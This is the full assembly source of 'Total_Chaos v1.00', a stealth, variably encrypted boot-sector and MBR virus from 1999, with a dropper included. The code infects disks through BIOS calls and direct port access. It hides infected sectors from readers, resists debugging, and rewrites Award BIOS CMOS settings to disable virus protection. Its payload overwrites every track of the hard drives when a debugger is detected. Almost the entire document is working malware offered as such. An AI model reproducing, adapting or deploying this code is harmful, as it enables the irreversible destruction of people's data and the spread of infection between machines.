;============================================================================
;
;
;     NAME: Total_Chaos v1.00
;     TYPE: Full-stealth variable encrypting bootsector/MBR infector.
;     SIZE: 2 sectors.
;   AUTHOR: T-2000 / [Immortal Riot].
;   E-MAIL: T2000_@hotmail.com
;     DATE: March 1999.
;  PAYLOAD: Inferno when being debugged.
;
;
;  FEATURES:
;
;       - Uses INT 13h & INT 76h to stealth.
;       - Infects via INT 13h & direct port-access.
;       - Tunneling on INT 13h.
;       - Variable encrypts loader & body.
;       - Prevents clean-booting.
;       - Disables BIOS virus-protection.
;       - Anti-debugging code.
;       - Highly destructive payload.
;
;
; Similair to Strange (IR#8) and MegaStealth (VLAD#3), this virus is capable
; of stealthing MBR-reads even if the original INT 13h-address is being used.
; Aside from this, the virus also sports alot of anti-removal techniques.
;
; Unfortunately I did not have the time to implement floppy-disk port-
; infection/stealth, for those interested, [NuKE] wrote an article about
; floppy-disk port-access, being published in some IJ-issue.
;
; Hail Satan...
;
;============================================================================


                .MODEL  TINY
                .STACK  1024
                .286
                .CODE


Virus_Begin:
                JMP     Boot_Loader
                NOP

                DB      0Dh, '[TOTAL_CHAOS 1.00]', 0Dh

                DB      0Dh, '[FiRST GENERATiON]', 0Dh

                ORG     62

Boot_Loader:    CMP     AX, 0
Home_TS         =       WORD PTR $-2

                CMP     AX, 0
Home_HD         =       WORD PTR $-2

                MOV     CX, (End_Encrypted - Encrypted)

                MOV     BX, 7C00h + (OFFSET End_Encrypted - 1)

                MOV     AL, 0
Init_Key_Loader =       BYTE PTR $-1

Decrypt_Byte:   XOR     [BX], AL                ; Decrypt virus-bootsector.
Signature       =       WORD PTR $-2

                DEC     BX

                SUB     AL, 0
Slide_Key_Ldr   =       BYTE PTR $-1

                RCL     AL, 2

                JMP     @1

                DB      0E9h                    ; Some overlapping code.

@1:             LOOP    Decrypt_Byte

Encrypted:      MOV     SI, 7C00h
                XOR     DI, DI

                MOV     SS, DI                  ; Setup a stack.
                MOV     SP, SI

                CALL    Anti_Debug

                MOV     DS, DI                  ; DS = 0.

                SUB     WORD PTR DS:[413h], 2   ; Steal 2 kB of DOS-memory.

                INT     12h

                SHL     AX, 6                   ; Calculate hiding-segment.
                MOV     ES, AX

                MOV     CH, (512 / 2) SHR 8     ; Copy virus-bootsector to
                CLD                             ; our stolen memory.
                REP     MOVSW

                PUSH    ES                      ; JMP to resident copy.
                PUSH    OFFSET Relocated_Boot
                RETF

Virus_Name      DB      'TOT4L CHAOS - ABS0LUTE FREEDOM', 0

Relocated_Boot: MOV     SI, 13h * 4
                PUSH    SI
                MOV     DI, OFFSET Traced_Int13h
                MOVSW
                MOVSW

                MOV     SI, 01h * 4

                PUSH    DS:[SI]                 ; Save the original
                PUSH    DS:[SI+2]               ; address of INT 01h.

                MOV     [SI], OFFSET New_Int01h ; Install our own handler.
                MOV     [SI+2], CS

                PUSHF
                POP     AX

                OR      AH, 00000001b           ; Set TF.

                PUSH    AX
                POPF

                MOV     AH, 0EFh                ; Trace an unknown function.
                CALL    Do_Traced_Int13h

                PUSHF                           ; Clear TF in case INT 13h's
                POP     AX                      ; entrypoint was not found.

                AND     AH, NOT 00000001b

                PUSH    AX
                POPF

                POP     DS:[SI+2]               ; Restore original INT 01h.
                POP     DS:[SI]

Try_Body_Load:  XOR     AH, AH                  ; Reset drive.
                MOV     DX, DS:[7C00h + Home_HD]
                CALL    Do_Traced_Int13h

                MOV     AX, 0201h               ; Load the rest of the
                MOV     BX, 512                 ; virus stored on disk.
                MOV     CX, DS:[7C00h + Home_TS]
                INC     CX
                CALL    Dispatcher
                JC      Try_Body_Load

                MOV     AL, 0
Init_Key_Body   =       BYTE PTR $-1

                MOV     CX, BX

Decrypt_Body:   XOR     CS:[BX], AL             ; Decrypt virus body-sector.

                INC     BX

                ADD     AL, CL

                LOOP    Decrypt_Body

                MOV     CS:Port_Stealth_Sw, CL

                MOV     SI, 76h * 4
                MOV     DI, OFFSET Prev_Int76h

                CLI

                MOVSW
                MOVSW
                MOV     [SI-4], OFFSET New_Int76h
                MOV     [SI-2], CS

                POP     SI
                MOV     DI, OFFSET Prev_Int13h

                MOVSW
                MOVSW
                MOV     [SI-4], OFFSET New_Int13h
                MOV     [SI-2], CS

                STI

                PUSH    DS                      ; ES = 0.
                POP     ES

                MOV     AX, 0201h               ; Make the virus infect C:
                MOV     BX, SP                  ; BX = 7C00h.
                INC     CX                      ; CX = 01h.
                MOV     DX, 80h
                INT     13h

                CALL    Anti_Debug

                CALL    Check_For_Award
                JNC     Load_Boot

Do_Int19h:      INT     19h                     ; Standard way of rebooting.

Load_Boot:      XOR     DL, DL                  ; Start on drive A:

                MOV     BP, 3                   ; Retry up to 3 times.

Try_Load_Boot:  XOR     AH, AH                  ; Reset drive.
                INT     13h

                MOV     AX, 0201h               ; Try to load the bootsector.
                INT     13h
                JNC     Execute_Boot

                DEC     BP
                JNZ     Try_Load_Boot

                OR      DL, DL                  ; Already tried C: ?
                JS      Do_Int19h               ; Then just use INT 19h.

                MOV     BP, 3
                MOV     DL, 80h                 ; Now try drive C:

                JMP     Try_Load_Boot

Execute_Boot:   PUSH    ES                      ; Pass control to bootsector.
                PUSH    BX
                RETF


Wait_IO_Ready:
                MOV     DL, 0F7h                ; Status-port.

Get_IO_Status:  IN      AL, DX

                OR      AL, AL                  ; Controller is executing
                JS      Get_IO_Status           ; a command ?

                RETN


Do_Traced_Int13h:

                PUSHF
                DB      9Ah
Traced_Int13h   DW      0, 0

                CLD

                RETN


Dispatcher:
                OR      DL, DL                  ; Can only use ports on
                JNS     Do_Traced_Int13h        ; harddrives.

                PUSHA

                MOV     SI, BX
                MOV     DI, BX

                MOV     BX, DX

                PUSH    AX

                MOV     DX, 1F2h                ; Amount of sectors.
                OUT     DX, AL

                INC     DX                      ; Sector number.
                MOV     AL, CL
                OUT     DX, AL

                INC     DX                      ; Track low.
                MOV     AL, CH
                OUT     DX, AL

                INC     DX                      ; Track high
                XOR     AL, AL
                OUT     DX, AL

                POP     CX

                INC     DX                      ; drive/head
                MOV     AL, 10100000b
                SHL     BL, 5                   ; Set correct drive (C:/D:).
                OR      AL, BL
                OR      AL, BH
                OUT     DX, AL

                INC     DX

                MOV     AL, CH
                SHL     AL, 4                   ; Convert to I/O-command.
                OUT     DX, AL

                CALL    Wait_IO_Ready

Read_In_Buffer: MOV     DL, 0F0h                ; Data-register.

                OR      CH, CH                  ; Was it a read or a write?

                PUSH    CX

                MOV     CX, (512 / 2)
                CLD

                JP      Write_IO

Read_IO:        REP     INSW

                CMP     AX, 0
                ORG     $-2

Write_IO:       REP     OUTSW

Exit_Dispatch:  POP     CX

                CALL    Wait_IO_Ready

                TEST    AL, 00001000b           ; Buffer requires servicing?
                JNZ     Read_In_Buffer          ; (more sectors to read).

                POPA

                CLC
                CLD

                RETN


New_Int01h:
                PUSH    BP
                PUSH    AX

                MOV     BP, SP

                MOV     AX, [BP+(3*2)]          ; CS of next instruction.

                CMP     AH, 0C8h                ; We're in ROM ?
                JB      Exit_Int01h

                CMP     AX, 0FFFFh              ; Skip HMA.
                JNB     Exit_Int01h

                MOV     CS:Traced_Int13h+2, AX

                MOV     AX, [BP+(2*2)]          ; IP of next instruction.
                MOV     CS:Traced_Int13h, AX

                ; Kill TF.

                AND     BYTE PTR [BP+(4*2)+1], NOT 00000001b

Exit_Int01h:    POP     AX
                POP     BP

                IRET


Anti_Debug:
                PUSHF
                PUSHA

                CLI

                IN      AL, 21h                 ; Flip state keyboard-lock.
                XOR     AL, 00000010b
                OUT     21h, AL

                PUSH    AX

                MOV     BP, SP

                POP     BX

                CMP     [BP], AX                ; We're being traced?
                JNE     Payload

                MOV     BX, [BP+(10*2)]         ; Return-address.

                CMP     BYTE PTR CS:[BX], 0CCh  ; It's a debug breakpoint?
                JE      Payload

                POPA
                POPF

                RETN


End_Encrypted:


                ORG    1EEh                     ; 4th partition data-block.

                ; Recursive partition.

                DW      0000h, 0001h, 0005h, 013Fh
                DW      0001h, 0000h, 007Eh, 0000h

                ORG     510

                DW      0AA55h


Payload:
                PUSH    CS
                POP     DS

                PUSH    CS
                POP     ES

                MOV     AH, 08h
                MOV     DL, 80h
                CALL    Do_Traced_Int13h

                OR      DL, 80h

                MOV     Max_Tracks, CH
                MOV     Max_Heads, DH

                AND     CL, 00111111b
                MOV     Sector_Count, CL

                JMP     $+2                     ; Hail my powerful 486 :)

                MOV     CL, 01h

                XOR     BX, BX

Trash_Drive:    DEC     DL                      ; We've did all drives?
                JNS     $                       ; Then just jam the system.

                MOV     DH, 0
Max_Heads       =       BYTE PTR $-1

Trash_Head:     DEC     DH                      ; We've did all heads?
                JS      Trash_Drive

                MOV     CH, 0
Max_Tracks      =       BYTE PTR $-1

Trash_Track:    SUB     CH, CL                  ; We've did all tracks?
                JC      Trash_Head

                MOV     AH, 0Dh                 ; Reset harddrive.
                CALL    Do_Traced_Int13h

                MOV     AX, 0300h               ; Smash all track-sectors.
Sector_Count    =       BYTE PTR $-2
                CALL    Dispatcher

                JMP     Trash_Track


New_Int76h:
                CALL    Anti_Debug

                PUSHF
                PUSHA
                PUSH    ES

                JMP     $                       ; Do-not-stealth switch.
Port_Stealth_Sw =       BYTE PTR $-1

                CLI

                MOV     DX, 1F3h                ; Get sector-number.
                IN      AL, DX

                CMP     AL, 01h                 ; They read the MBR ?
                JNE     Exit_Int76h

                INC     DX                      ; Get track-number low.
                IN      AL, DX

                MOV     AH, AL

                MOV     DL, 0F5h                ; Get track-number high.
                IN      AL, DX

                OR      AX, AX                  ; Track 0 ?
                JNZ     Exit_Int76h

                INC     DX                      ; Get drive & head.
                IN      AL, DX

                TEST    AL, 00001111b           ; They read from track 0 ?
                JNZ     Exit_Int76h

                PUSH    CS
                POP     ES

                MOV     DL, 0F0h

                MOV     DI, OFFSET Buffer       ; Read in the read sector.
                MOV     CX, (512 / 2)
                CLD
                REP     INSW

                INC     CX                      ; CL = 01h.

                ; Is it actually infected?

                CMP     ES:[DI+(Signature-Virus_Begin)-512], 0730h
                JNE     Re_Read_Clean

                MOV     CL, BYTE PTR ES:[DI+(Home_TS-Virus_Begin)-512]

Re_Read_Clean:  MOV     DL, 0F2h                ; Read one sector.
                MOV     AL, 01h
                OUT     DX, AL

                INC     DX                      ; Sector to read.
                MOV     AL, CL
                OUT     DX, AL

                MOV     DL, 0F7h                ; Read with retry.
                MOV     AL, 20h
                OUT     DX, AL

                CALL    Wait_IO_Ready           ; Wait till read is finished.

        ; The original bootsector/MBR is not encrypted, since I
        ; can't seem to put the sector back after decrypting it.

Exit_Int76h:    POP     ES
                POPA
                POPF

                CALL    Anti_Debug

                DB      0EAh
Prev_Int76h     DW      0, 0


; Returns CF when no Award-BIOS is present.
Check_For_Award:
                PUSHA
                PUSH    ES

                PUSH    0F000h                  ; Standard ROM-BIOS segment.
                POP     ES

                XOR     DI, DI

Scan_For_Award: CMP     DI, 0FF00h              ; Assume not found?
                JA      No_Award_Found          ; JA=JC.

                PUSH    DI

                MOV     SI, OFFSET Award_String ; Scan for 'Award'.
                MOV     CL, 5
                CLD
                SEGCS
                REPE    CMPSB

                POP     DI

                PUSHF

                INC     DI

                POPF

                JNE     Scan_For_Award

                CLC

No_Award_Found: POP     ES
                POPA

                RETN


Award_String    DB      'Award'


New_Int13h:
                CALL    Anti_Debug

                MOV     CS:Int13h_AH, AH        ; Save AH's value.

                PUSHF                           ; Run the original handler.
                DB      9Ah
Prev_Int13h     DW      0, 0
                JC      Return_Caller           ; Skip our own stuff on fail.

                PUSHF
                PUSHA
                PUSH    DS
                PUSH    ES

                MOV     AL, 0                   ; Initial value of AH.
Int13h_AH       =       BYTE PTR $-1

                CMP     AL, 02h                 ; Read sector(s) ?
                JE      Check_Params

                CMP     AL, 03h                 ; Write sector(s) ?
                JE      Check_Params

                CMP     AL, 0Ah                 ; Read long sector(s) ?
                JE      Check_Params

                CMP     AL, 0Bh                 ; Write long sector(s) ?
                JNE     Exit_Int13h

Check_Params:   OR      DH, DH                  ; Head 0 ?
                JNZ     Exit_Int13h

                DEC     CX                      ; It's a bootsector/MBR ?
                JNZ     Exit_Int13h

                ; Can't have our own stealth-routine fuck things up.

                MOV     CS:Port_Stealth_Sw, (Exit_Int76h - Port_Stealth_Sw) - 1

                CALL    Infect_Boot             ; Infect/stealth.

                AND     CS:Port_Stealth_Sw, 0   ; Enable INT 76h stealth.

Exit_Int13h:    POP     ES
                POP     DS
                POPA
                POPF

Return_Caller:  CALL    Anti_Debug

                RETF    2                       ; Return to our caller.

                DB      '666', 0

Infect_Boot:
                PUSH    ES
                POP     DS

                CALL    Check_For_Award         ; Skip this routine when
                JC      Check_Boot              ; there ain't no Award-CMOS.

                MOV     AL, 3Ch                 ; We want a byte from CMOS.
                OUT     70h, AL

                JMP     $+2                     ; Delay for I/O.

                IN      AL, 71h                 ; Read an Award status-byte.

                PUSH    AX

                MOV     AL, 3Ch                 ; Prepare CMOS to get our
                OUT     70h, AL                 ; manipulated byte.

                POP     AX

                OR      AL, 10000001b           ; Disable virus-protection.
                                                ; Set boot-sequence C: A:.

                OUT     71h, AL                 ; Put back manipulated byte.

; My original intention was to also set a random password in the BIOS-menu,
; so people could not change the boot-sequence to prevent the virus from
; becoming resident. However, my Award-CMOS seems to follow a different
; format than the one specified in many manuals, in fact, it almost seems
; as if my CMOS ain't modified at all by the password-settings! Weird...

Check_Boot:     CMP     DS:[BX+510], 0AA55h     ; Make sure it's a valid
                JNE     JMP_Exit_Inf_B          ; bootsector/MBR.

                ; This disk is infected?

                CMP     DS:[BX+(Signature-Virus_Begin)], 0730h
                JNE     Do_Infect_Boot

                ; Re-read original bootsector/MBR over the
                ; infected one in the caller's buffer.

Try_Read_Boot:  XOR     AH, AH
                MOV     DX, DS:[BX+(Home_HD-Virus_Begin)]
                CALL    Do_Traced_Int13h

                MOV     AX, 0201h
                MOV     CX, DS:[BX+(Home_TS-Virus_Begin)]
                CALL    Dispatcher
                JC      Try_Read_Boot

JMP_Exit_Inf_B: JMP     Exit_Inf_Boot

Do_Infect_Boot: XOR     AH, AH                  ; Give him a reset.
                CALL    Do_Traced_Int13h
                JC      JMP_Exit_Inf_B

                PUSH    CS
                POP     ES

                MOV     BP, 512

                MOV     SI, BX                  ; Copy the original boot
                MOV     DI, OFFSET Buffer       ; to our buffer.
                PUSH    DI
                MOV     CX, BP
                REP     MOVSB

                CLI

                XCHG    SP, AX                  ; Some lame anti-debugging.

                MOV     DI, 3                   ; Save the boot's DPB.
                LEA     SI, [BX+DI]
                MOV     CL, 59
                REP     MOVSB

                XCHG    SP, AX

                STI

                POP     BX

                PUSH    CS
                POP     DS

                OR      DL, DL                  ; We're raping a FD or a HD ?
                JNS     Calc_Home_FD

Calc_Home_HD:   PUSH    BX
                PUSH    DX
                PUSH    ES

                MOV     AH, 08h                 ; Get drive-parameters.
                CALL    Do_Traced_Int13h

                POP     ES
                POP     DX
                POP     BX

                AND     CX, 0000000000111111b   ; We only need sector-count.

                DEC     CX                      ; Last 2 sectors on track 0.

                JMP     Store_Body

Calc_Home_FD:   MOV     AX, [BX+13h]            ; Total amount of sectors.

                OR      AX, AX                  ; Ignore 32M+ disks.
                JZ      Exit_Inf_Boot

                PUSH    DX

                XOR     DX, DX
                DIV     WORD PTR [BX+1Ah]       ; Number of heads.

                DIV     WORD PTR [BX+18h]       ; Sectors per track.

                POP     DX

                DEC     AX

                MOV     CH, AL
                INC     CX

                MOV     DH, [BX+1Ah]            ; Number of heads.
                DEC     DH

Store_Body:     PUSHA

                MOV     SI, BP                  ; Copy 2nd virus-sector to
                MOV     DI, OFFSET Buffer + 512 ; our buffer for encryption.
                MOV     CX, BP
                REP     MOVSB

                IN      AL, 40h                 ; Set random key.
                MOV     Init_Key_Body, AL

                MOV     CX, BP

Encrypt_Body:   XOR     [BX+512], AL            ; Encrypt virusbody.

                INC     BX

                ADD     AL, CL

                LOOP    Encrypt_Body

                POPA

                MOV     AX, 0302h               ; Store old boot + body.
                CALL    Dispatcher
                JC      Exit_Inf_Boot

                XOR     SI, SI

                MOV     [SI+(Home_TS-Virus_Begin)], CX
                MOV     [SI+(Home_HD-Virus_Begin)], DX

                IN      AX, 40h
                MOV     Init_Key_Loader, AL
                MOV     Slide_Key_Ldr, AH

                MOV     DI, BX                  ; Copy virus-loader to our
                MOV     CX, BP                  ; buffer for encryption.
                REP     MOVSB

                MOV     SI, OFFSET Buffer + ((End_Encrypted - Virus_Begin) - 1)

                MOV     CX, (End_Encrypted-Encrypted)

Encrypt_Byte:   XOR     [SI], AL

                DEC     SI

                SUB     AL, AH

                RCL     AL, 2

                LOOP    Encrypt_Byte

                JCXZ    Write_Inf_Boot

                DB      0E9h, 66h

Write_Inf_Boot: MOV     AX, 0301h               ; Write infected boot.
                INC     CX
                XOR     DH, DH
                CALL    Dispatcher

Exit_Inf_Boot:  RETN


Author_Sign     DB      '=[T2/IR]='

;----------------------------------------------------------------------------

Buffer          DB      (1024 * 2) DUP(0)



                ; This is just a lame dropper which installs
                ; the bootvirus in memory and infects drive C:

START:

Attempt_Alloc:  MOV     AH, 48h
                MOV     BX, (2048 / 16)
                INT     21h
                JNC     Move_To_Alloc

                MOV     AH, 4Ah
                MOV     BX, 0FFFFh
                INT     21h

                MOV     AH, 4Ah
                SUB     BX, (2048 / 16) + 1
                INT     21h

                JMP     Attempt_Alloc

Move_To_Alloc:  MOV     ES, AX

                DEC     AX
                MOV     DS, AX

                XOR     SI, SI
                XOR     DI, DI

                MOV     [SI.MCB_PSP], 08h

                MOV     CX, (1024 / 2)
                CLD
                SEGCS
                REP     MOVSW

                PUSH    ES
                POP     DS

                MOV     Port_Stealth_Sw, CL

                MOV     AX, 3513h
                INT     21h

                MOV     Traced_Int13h, BX
                MOV     Traced_Int13h+2, ES

                MOV     Prev_Int13h, BX
                MOV     Prev_Int13h+2, ES

                MOV     AH, 25h
                MOV     DX, OFFSET New_Int13h
                INT     21h

                MOV     AX, 3576h
                INT     21h

                MOV     Prev_Int76h, BX
                MOV     Prev_Int76h+2, ES

                MOV     AH, 25h
                MOV     DX, OFFSET New_Int76h
                INT     21h

                PUSH    CS
                POP     DS

                PUSH    CS
                POP     ES

                MOV     AX, 0201h
                MOV     BX, OFFSET Dropper_Buffer
                INC     CX
                MOV     DX, 80h
                INT     13h

                MOV     AH, 09h
                MOV     DX, OFFSET Dropper_Msg
                INT     21h

Exit:           MOV     AX, 4C00h
                INT     21h

Dropper_Msg     DB      'Virus installed in memory', 0Ah, 0Dh, '$'

Dropper_Buffer  DB      512 DUP(0)


MCB_Header      STRUC
MCB_Type        DB      0               ; M = not last block, Z = last block.
MCB_PSP         DW      0               ; PSP-segment of this block.
MCB_Size_Mem    DW      0               ; Size of block in paragraphs.
MCB_Dunno       DB      3 DUP(0)        ; Don't care, don't need it.
MCB_Program     DW      4 DUP(0)        ; Filename of program of this block.
MCB_Header      ENDS

                END     START
